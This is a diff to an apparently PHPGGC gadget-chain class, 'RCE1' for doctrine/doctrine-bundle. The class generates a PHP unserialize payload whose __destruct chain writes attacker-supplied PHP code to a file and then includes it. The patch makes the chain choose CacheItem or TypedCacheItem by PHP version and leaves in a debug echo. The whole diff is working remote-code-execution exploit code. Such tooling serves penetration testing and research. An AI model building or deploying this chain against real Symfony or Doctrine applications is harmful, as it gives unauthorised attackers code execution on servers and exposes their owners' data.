@@ -3,6 +3,7 @@
 namespace GadgetChain\Doctrine;
 
 use Doctrine\Common\Cache\Psr6\CacheAdapter;
+use Doctrine\Common\Cache\Psr6\TypedCacheItem;
 use Doctrine\Common\Cache\Psr6\CacheItem;
 use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
 use Symfony\Component\Cache\Adapter\ProxyAdapter;
@@ -12,10 +13,10 @@ use Symfony\Component\HttpFoundation\Session\Storage\MetadataBag;
 
 class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
 {
-    public static $version = 'v1.5.1 <= v2.7.2';
+    public static $version = '1.5.1 <= 2.7.2';
     public static $vector = '__destruct';
     public static $author = 'Remsio';
-    public static $information = 'Based on package doctrine/doctrine-bundle, the Symfony bundle for doctrine. The chain is based on one chain to write, and on another one to include.';
+    public static $information = 'Based on package doctrine/doctrine-bundle, the Symfony bundle for doctrine. The chain is based on one chain to write, and on another one to include. Be careful, the POP chain differs depending on the PHP version';
 
     /**
      * Fast destruct implementation for both chains, mandatory to make sure the payload triggers correctly
@@ -44,6 +45,18 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
     public function generate(array $parameters)
     {
         $code = $parameters['code'];
+        /* CacheItem is compatible with PHP 7.*, TypedCacheItem is compatible with PHP 8.* */
+        if (preg_match('/^7/', phpversion()))
+        {
+            $firstCacheItem = new CacheItem();
+            $secondCacheItem = new CacheItem();
+        } 
+        else 
+        {
+            $firstCacheItem = new TypedCacheItem();
+            $secondCacheItem = new TypedCacheItem();
+        }
+        echo phpversion();
 
         /* File write */
         $obj_write = new CacheAdapter();
@@ -51,14 +64,14 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
         $mockFileSessionStorage->data = array('<?php '. $code. ' ?>'); // Content put in the file
         $mockFileSessionStorage->metadataBag = new MetadataBag();
         $obj_write->cache = $mockFileSessionStorage;
-        $obj_write->deferredItems = [new CacheItem()];
+        $obj_write->deferredItems = [$firstCacheItem];
         
         /* File inclusion */
         $obj_include = new CacheAdapter();
         $proxyAdapter = new ProxyAdapter();
         $proxyAdapter->pool = new PhpArrayAdapter();
         $obj_include->cache = $proxyAdapter;
-        $cacheItem = new CacheItem();
+        $cacheItem = $secondCacheItem;
         $cacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
         $obj_include->deferredItems = [$cacheItem];
         $obj = array(1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1 );
